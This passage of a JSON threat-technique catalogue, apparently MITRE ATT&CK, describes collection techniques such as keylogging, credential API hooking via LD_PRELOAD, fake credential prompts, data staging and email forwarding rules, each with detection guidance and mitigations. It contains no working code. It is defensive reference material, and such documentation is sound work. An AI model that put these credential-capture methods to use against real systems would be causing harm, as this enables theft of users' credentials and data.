C2)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Consider using the host firewall to restrict file sharing communications such as SMB. <a href=\"https://support.microsoft.com/en-us/help/3185535/preventing-smb-traffic-from-lateral-connections\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Preventing SMB)</a>"}],"subTechniques":[]}]},{"tactic":"Collection","techniques":[{"id":"T1005","name":"Data from Local System","description":"Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_protocols_through_showmon.html#wp2760878733\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: show_run_config_cmd_cisco)</a> Adversaries may also use Automated Collection on the local system.","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, Network Device CLI commands may also be used to collect files such as configuration files with built-in features native to the network device platform. (Citation: Mandiant APT41 Global Intrusion ) <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nFor network infrastructure devices, collect AAA logging to monitor <code>show</code> commands that view configuration files.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: OS API Execution","Script: Script Execution","Command: Command Execution","Process: Process Creation","File: File Access"],"mitigations":[{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted."}],"subTechniques":[]},{"id":"T1025","name":"Data from Removable Media","description":"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted."}],"subTechniques":[]},{"id":"T1039","name":"Data from Network Shared Drive","description":"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Share: Network Share Access","Command: Command Execution","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","File: File Access"],"mitigations":[],"subTechniques":[]},{"id":"T1056","name":"Input Capture","description":"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).","detection":"Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. <code>SetWindowsHook</code>, <code>GetKeyState</code>, and <code>GetAsyncKeyState</code>) <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a>, monitoring for malicious instances of Command and Scripting Interpreter, and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Modification","Process: Process Creation","Windows Registry: Windows Registry Key Modification","Process: Process Metadata","Process: OS API Execution","Driver: Driver Load"],"mitigations":[],"subTechniques":[{"id":"T1056.001","name":"Keylogging","description":"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems. <a href=\"https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Kimsuky Nov 2021)</a>\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a> Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include <code>SetWindowsHook</code>, <code>GetKeyState</code>, and <code>GetAsyncKeyState</code>. <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a> Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Driver: Driver Load","Process: OS API Execution","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1056.002","name":"GUI Input Capture","description":"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. <a href=\"https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Exploits MacKeeper)</a> This type of prompt can be used to collect credentials via various languages such as AppleScript <a href=\"https://logrhythm.com/blog/do-you-trust-your-computer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogRhythm Do You Trust Oct 2014)</a> <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> and PowerShell. <a href=\"https://logrhythm.com/blog/do-you-trust-your-computer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogRhythm Do You Trust Oct 2014)</a> <a href=\"https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Phishing for Credentials Jan 2015)</a> <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell). <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a>\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.","detection":"Monitor process execution for unusual programs as well as malicious instances of Command and Scripting Interpreter that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious. <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.","platforms":["Linux","macOS","Windows"],"dataSources":["Script: Script Execution","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Use user training as a way to bring awareness and raise suspicion for potentially malicious events and dialog boxes (ex: Office documents prompting for credentials)."}]},{"id":"T1056.003","name":"Web Portal Capture","description":"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. <a href=\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Virtual Private Keylogging)</a>","detection":"File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to modify the Web content of organization login portals to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."}]},{"id":"T1056.004","name":"Credential API Hooking","description":"Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials. <a href=\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)</a> Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. \n\nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\n* <strong>Hooks procedures</strong>, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hook Overview)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n* <strong>Import address table (IAT) hooking</strong>, which use modifications to a process’s IAT, where pointers to imported API functions are stored. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> <a href=\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adlice Software IAT Hooks Oct 2014)</a> <a href=\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MWRInfoSecurity Dynamic Hooking 2015)</a>\n* <strong>Inline hooking</strong>, which overwrites the first bytes in an API function to redirect code flow. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> <a href=\"https://www.exploit-db.com/docs/17802.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HighTech Bridge Inline Hooking Sept 2011)</a> <a href=\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MWRInfoSecurity Dynamic Hooking 2015)</a>\n\nIn Linux and macOS, adversaries may hook into system functions via the <code>LD_PRELOAD</code> (Linux) or <code>DYLD_INSERT_LIBRARIES</code> (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the <code>libc read</code> function leveraged by SSH or SCP. <a href=\"https://intezer.com/blog/research/new-linux-threat-symbiote/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Symbiote 2022)</a>","detection":"Monitor for calls to the <code>SetWindowsHookEx</code> and <code>SetWinEventHook</code> functions, which install a hook procedure. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hook Overview)</a> <a href=\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Detecting Hooks Sept 2012)</a> Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools <a href=\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Detecting Hooks Sept 2012)</a> <a href=\"https://github.com/prekageo/winhook\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PreKageo Winhook Jul 2011)</a> <a href=\"https://github.com/jay/gethooks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Jay GetHooks Sept 2011)</a> or by programmatically examining internal kernel structures. <a href=\"https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Zairon Hooking Dec 2006)</a> <a href=\"https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EyeofRa Detecting Hooking June 2017)</a>\n\nRootkits detectors <a href=\"http://www.gmer.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GMER Rootkits)</a> can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Snapshot)</a> to compare the in-memory IAT to the real addresses of the referenced functions. <a href=\"https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: StackExchange Hooks Jul 2012)</a> <a href=\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adlice Software IAT Hooks Oct 2014)</a>","platforms":["Windows","Linux","macOS"],"dataSources":["Process: Process Metadata","Process: OS API Execution"],"mitigations":[]}]},{"id":"T1074","name":"Data Staged","description":"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location. <a href=\"https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PWC Cloud Hopper April 2017)</a>\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nConsider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["File: File Access","File: File Creation","Windows Registry: Windows Registry Key Modification","Command: Command Execution"],"mitigations":[],"subTechniques":[{"id":"T1074.001","name":"Local Data Staging","description":"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry. <a href=\"https://web.archive.org/web/20220629230035/https://www.prevailion.com/darkwatchman-new-fileless-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Prevailion DarkWatchman 2021)</a>","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nConsider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["File: File Creation","Windows Registry: Windows Registry Key Modification","File: File Access","Command: Command Execution"],"mitigations":[]},{"id":"T1074.002","name":"Remote Data Staging","description":"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.","detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["File: File Creation","Command: Command Execution","File: File Access"],"mitigations":[]}]},{"id":"T1113","name":"Screen Capture","description":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>. <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CopyFromScreen .NET)</a> <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Antiquated Mac Malware)</a>","detection":"Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: OS API Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1114","name":"Email Collection","description":"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a> <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA AA20-352A 2021)</a> Adversaries can collect or forward email from mail servers or clients.","detection":"There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox. <a href=\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)</a> High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":["Windows","macOS","Linux","Office Suite"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content","Network Traffic: Network Connection Creation","File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1032","name":"Multi-factor Authentication","description":"Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages."},{"id":"M1047","name":"Audit","description":"Enterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis.\n\nIn an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious auto-forwarding rules. <a href=\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)</a>"},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}],"subTechniques":[{"id":"T1114.001","name":"Local Email Collection","description":"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. <a href=\"https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlook File Sizes)</a> IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in <code>C:\\Users\\&lt;username&gt;\\Documents\\Outlook Files</code> or <code>C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Outlook</code>. <a href=\"https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Outlook Files)</a>","detection":"Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Windows"],"dataSources":["File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1041","name":"Encrypt Sensitive Information","description":"Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages."},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Implement secure out-of-band alerts to notify security teams of unusual local email activities, such as mass forwarding or large attachments being sent, indicating potential data exfiltration attempts. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}]},{"id":"T1114.002","name":"Remote Email Collection","description":"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.","detection":"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).","platforms":["Office Suite","Windows"],"dataSources":["Application Log: Application Log Content","Logon Session: Logon Session Creation","Command: Command Execution","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1032","name":"Multi-factor Authentication","description":"Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages."},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. \n\nFor highly sensitive information, utilize out-of-band communication channels instead of relying solely on email. This reduces the risk of sensitive data being collected through compromised email accounts.\n\nSet up out-of-band alerts to notify security teams of unusual email activities, such as mass forwarding or large attachments being sent, which could indicate email collection attempts.\n\nCreate plans for leveraging a secure out-of-band communications channel, rather than an existing in-network email server, in case of a security incident. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}]},{"id":"T1114.003","name":"Email Forwarding Rule","description":"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-086A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-068A 2018)</a> Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. <a href=\"https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pfammatter - Hidden Inbox Rules)</a> Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes. <a href=\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)</a> <a 